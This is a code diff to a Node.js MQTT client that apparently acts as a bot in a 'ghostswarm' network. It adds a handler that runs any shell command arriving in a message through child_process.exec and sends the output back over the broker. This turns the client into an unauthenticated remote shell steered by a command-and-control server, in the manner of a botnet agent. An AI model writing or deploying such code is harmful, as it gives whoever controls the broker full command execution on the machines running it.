@@ -1,4 +1,5 @@
 const mqtt = require('mqtt');
+const { exec } = require('child_process');
 
 const BOT_ID = process.env.BOT_ID || 'bot123';
 const MQTT_BROKER = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';
@@ -24,16 +25,38 @@ mqttClient.on('message', (topic, message) => {
       const payload = JSON.parse(message.toString());
       console.log(`📥 [${BOT_ID}] received:`, payload);
 
-      // Echo response to status channel
       const statusTopic = `ghostswarm/${BOT_ID}/status`;
-      mqttClient.publish(statusTopic, JSON.stringify({
-         received: payload,
-         status: "ok",
-         time: Date.now()
-      }));
 
-      console.log(`📤 [${BOT_ID}] responded to status`);
+      // Handle different message types
+      if (payload.type === 'shell' && payload.cmd) {
+         // Execute shell command
+         exec(payload.cmd, (err, stdout, stderr) => {
+            mqttClient.publish(statusTopic, JSON.stringify({
+               requestId: payload.requestId,
+               output: err ? stderr || 'Command failed' : stdout.trim(),
+               status: err ? 'error' : 'ok',
+               time: Date.now()
+            }));
+            console.log(`📤 [${BOT_ID}] shell command executed and responded`);
+         });
+      } else {
+         // General echo response for non-shell commands
+         mqttClient.publish(statusTopic, JSON.stringify({
+            received: payload,
+            status: "ok",
+            time: Date.now()
+         }));
+         console.log(`📤 [${BOT_ID}] responded to status`);
+      }
    } catch (err) {
       console.error(`❌ [${BOT_ID}] failed to handle message`, err);
+
+      // Send error response
+      const statusTopic = `ghostswarm/${BOT_ID}/status`;
+      mqttClient.publish(statusTopic, JSON.stringify({
+         status: "error",
+         error: err.message,
+         time: Date.now()
+      }));
    }
 });
